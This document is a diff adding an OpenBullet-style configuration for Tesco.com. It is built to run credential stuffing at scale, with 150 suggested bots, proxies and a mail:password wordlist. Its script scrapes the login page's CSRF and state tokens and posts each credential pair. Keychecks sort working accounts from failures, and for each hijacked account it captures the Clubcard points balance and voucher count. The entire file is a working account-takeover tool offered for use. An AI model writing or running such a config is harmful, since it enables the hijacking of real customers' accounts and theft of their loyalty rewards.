@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "Tesco.com",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-10T19:26:00.4246585+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://secure.tesco.com/account/en-GB/login?from=/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "\"state\" value=\"" "\"" Recursive=FALSE -> VAR "STATE" "" "" 
+PARSE "<SOURCE>" LR "\"_csrf\" value=\"" "\"" Recursive=FALSE -> VAR "CSRF" "" "" 
+#POST_REQUEST REQUEST POST "https://secure.tesco.com/account/en-GB/login?from=/" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&state=<STATE>&_csrf=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Unfortunately we do not recognise those details" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Unfortunately we do not recognise those details" 
+#CHECK_AUTH REQUEST GET "https://www.tesco.com/ce-assets/checkAuth" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "{\"signedIn\":false}" 
+  KEYCHAIN Success OR 
+    KEY "{\"signedIn\":true}" 
+#CLUBCARD_REQUEST REQUEST GET "https://secure.tesco.com/Clubcard/MyAccount/Home/Home" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "usr_auth_status: 'logged in'," 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "usr_auth_status: 'logged in'," 
+PARSE "<SOURCE>" LR "<td class=\"ddl-no-wrap\"><span class=\"pointvalue\">" "</span>pts" Recursive=FALSE -> CAP "Points" "" "" 
+REQUEST GET "https://secure.tesco.com/Clubcard/MyAccount/Vouchers/AvailableVouchers?{}" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://secure.tesco.com/Clubcard/MyAccount/Home/Home" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"count\":\"" 
+PARSE "<SOURCE>" LR "\"count\":\"" "\"" Recursive=FALSE -> CAP "Vouchers" "" "" 
